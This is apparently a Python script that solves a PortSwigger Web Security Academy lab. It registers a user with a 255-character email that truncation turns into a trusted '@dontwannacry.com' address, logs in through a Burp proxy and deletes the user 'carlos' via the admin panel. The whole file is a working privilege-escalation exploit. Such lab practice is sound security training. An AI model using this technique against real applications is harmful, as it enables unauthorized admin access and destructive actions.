import requests
from bs4 import BeautifulSoup

URL = "https://ac7e1ffe1fdde44fc057a6c300db00de.web-security-academy.net"
proxies = {
	"http" : "http://127.0.0.1:8080",
    "https" : "https://127.0.0.1:8080",
}

def getCsrf(text):
    soup = BeautifulSoup(text, 'html.parser')
    csrfToken = soup.find('input',attrs = {'name':'csrf'})['value']
    print(f"[+] CSRF Token: {csrfToken}")
    return csrfToken

# To intercept requesst in burp, export the following:
     # export REQUESTS_CA_BUNDLE="/path/to/pem/encoded/cert"
     # export REQUESTS_CA_BUNDLE="/home/vlaghe/proj/sec/burp_labs/burp.pem"
     # export HTTP_PROXY="http://127.0.0.1:8080"
     # export HTTPS_PROXY="http://127.0.0.1:8080"

# Session setup
s = requests.Session()
s.proxies = proxies

# App accepts a max of 255 char email addr
#   A                       - 238
#   @dontwannacry           - 16
#                           = 255
#   + email id to register will get thrown out after login
payload = "A" * 238 + "@dontwannacry.com" + ".exploit-ac561f601f56e468c0fea69001a5005f.web-security-academy.net"

# Register new user
r = s.get(URL + "/register")
token = getCsrf(r.text)
reg_data = {
    'csrf': token,
    'username': 'pwn',
    'password': 'pwn',
    'email':    payload
}
r = s.post(URL + "/register", data=reg_data)
print("[+] Registering new user pwn with payload")
print(r.text)

# Go to https://exploit-ac4c1f6f1e6fa4bec06a563d018a00a6.web-security-academy.net/email & confirm registration
wut = input('Confirm registration in mail client (Enter to continue)')

# Login as new user
log_data = {
    'csrf': token,
    'username': 'pwn',
    'password': 'pwn'
}
r = s.post(URL + "/login", data=log_data)
print("[+] Logging in...")
print(r.text)

# Access admin panel & delete Carlos
r = s.get(URL + "/admin/delete?username=carlos")
print(r.text)

